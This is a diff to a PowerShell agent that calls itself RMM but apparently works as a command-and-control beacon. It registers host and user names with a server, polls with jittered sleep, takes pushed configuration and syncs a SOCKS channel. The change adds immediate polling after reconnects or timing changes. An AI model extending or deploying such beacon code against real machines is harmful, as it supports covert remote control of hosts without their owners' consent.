@@ -57,6 +57,7 @@ $httpProxyUseDefaultCredentials = $false
 $verboseHttp = $false
 
 $script:RmmRegisterConfigSynced = $false
+$script:RmmFastPoll = $false
 
 # -----------------------------------------------------------------------------
 # Optional environment overrides (when set, they replace the variables above)
@@ -1971,7 +1972,7 @@ function Register-RmmSession {
         [switch]$Reconnect
     )
     $registerQs = "id=$([uri]::EscapeDataString($sessionId))&h=$([uri]::EscapeDataString($computerName))&u=$([uri]::EscapeDataString($userName))"
-    if (-not $script:RmmRegisterConfigSynced) {
+    if (-not $script:RmmRegisterConfigSynced -or $Reconnect) {
         $registerQs += "&s=$($script:baseSleepSeconds)&j=$($script:jitterPercent)&sync=1"
     }
     $registerUrl = "$u/register?$registerQs"
@@ -2048,7 +2049,11 @@ while (-not $registered) {
 while ($true) {
     try {
         [RmmHostAnchor]::Restore()
-        $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent
+        if (-not $script:RmmFastPoll) {
+            $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent
+        } else {
+            $script:RmmFastPoll = $false
+        }
 
         Write-Host "[*] Beacon poll..." -ForegroundColor DarkGray
         $headers = Get-RmmRequestHeaders
@@ -2078,7 +2083,12 @@ while ($true) {
         
         if ($command -and $command -ne "") {
             if ($command -like "__CONFIG__ *") {
+                $beforeSleep = $script:baseSleepSeconds
+                $beforeJitter = $script:jitterPercent
                 $null = Update-Configuration -configString $command
+                if ($script:baseSleepSeconds -ne $beforeSleep -or $script:jitterPercent -ne $beforeJitter) {
+                    $script:RmmFastPoll = $true
+                }
                 Sync-RmmSocksChannelFromServer -CmdData $cmdData
                 continue
             }
@@ -2318,6 +2328,7 @@ while ($true) {
 
         try {
             if (Register-RmmSession -Quiet -Reconnect) {
+                $script:RmmFastPoll = $true
                 $currentRetry = 0
                 continue
             }
